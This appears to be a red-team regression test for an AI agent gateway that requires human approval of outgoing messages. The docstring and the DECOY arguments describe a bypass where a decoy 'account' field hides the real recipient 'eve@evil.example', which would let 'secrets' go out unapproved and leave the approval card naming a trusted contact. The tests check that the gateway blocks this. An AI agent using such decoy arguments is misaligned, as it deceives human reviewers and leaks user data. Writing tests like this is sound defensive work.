"""RT-3 (step-up bypass + misleading trusted card, live gateway, default policy).

``descriptor._derive_target`` prefers ANY account-typed key (account, payee,
iban, ...) over the email recipients, and ``policy.decide`` /
``render_card`` / ``record_effect`` all use that target. A decoy
``account: <known contact>`` therefore
  (a) hides a first-time recipient from the first_time_recipient step-up, so
      ``send_message`` (default allow) exfiltrates to a new address with NO
      approval at all; and
  (b) makes the trusted card title read "SEND to <known contact>" and drops
      the first_time_recipient risk line, while ``to`` is the attacker.
Asserts the SECURE behaviour.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from rt_live import RT_FLOOD, default_policy, live, setup  # noqa: E402,F401  (pytest fixture)


def _make_bob_known(human, agent):
    r = agent.call("send_email", {"to": "bob@example.com", "subject": "hi", "body": "x"})
    aid = r.json()["approval_id"]
    human.approve(aid)
    assert agent.execute(aid).status_code == 200


def test_decoy_account_does_not_bypass_first_time_recipient(live):
    gw, human, agent = live
    _make_bob_known(human, agent)
    # control: plain first-time recipient is challenged
    assert agent.call("send_message", {"to": "eve@evil.example", "body": "secrets"}).status_code == 202
    r = agent.call("send_message", {"to": "eve@evil.example", "account": "bob@example.com", "body": "secrets"})
    assert r.status_code != 200, f"exfiltration to a first-time recipient executed without approval: {r.text}"
    assert not [e for e in gw.ledger() if e["descriptor"]["args"].get("to") == "eve@evil.example"]


DECOY = {"to": "eve@evil.example", "account": "bob@example.com", "subject": "s", "body": "b"}


def _untyped_policy():
    pol = default_policy(schema_library=False, flood=dict(RT_FLOOD))
    for spec in pol["tools"].values():
        spec.pop("args", None)
    return pol


def _assert_title_names_real_recipient(human, r):
    assert r.status_code == 202
    card = human.view(r.json()["approval_id"])["card"]
    assert "eve@evil.example" in card["title"], f"trusted title hides the real recipient: {card['title']!r}"
    assert any("eve@evil.example" in l for l in card["risk_lines"]), card["risk_lines"]


def test_card_title_names_the_real_recipient(live, tmp_path):
    gw, human, agent = live
    _make_bob_known(human, agent)
    r = agent.call("send_email", DECOY)
    # D-005 item 4 (added by the defense fixer): the decoy argument is not in
    # send_email's declared, CLOSED schema -> denied outright.
    assert r.status_code == 403 and "unknown_argument:account" in r.json()["reasons"], r.text
    # The rendering property must still hold for a tool WITHOUT a declared
    # schema (legacy heuristic typing): recipients are the union of all
    # recipient-like arguments, so the title names eve.
    gw2, human2, agent2 = setup(tmp_path / "untyped", policy=_untyped_policy())
    try:
        _make_bob_known(human2, agent2)
        _assert_title_names_real_recipient(human2, agent2.call("send_email", DECOY))
    finally:
        gw2.__exit__()
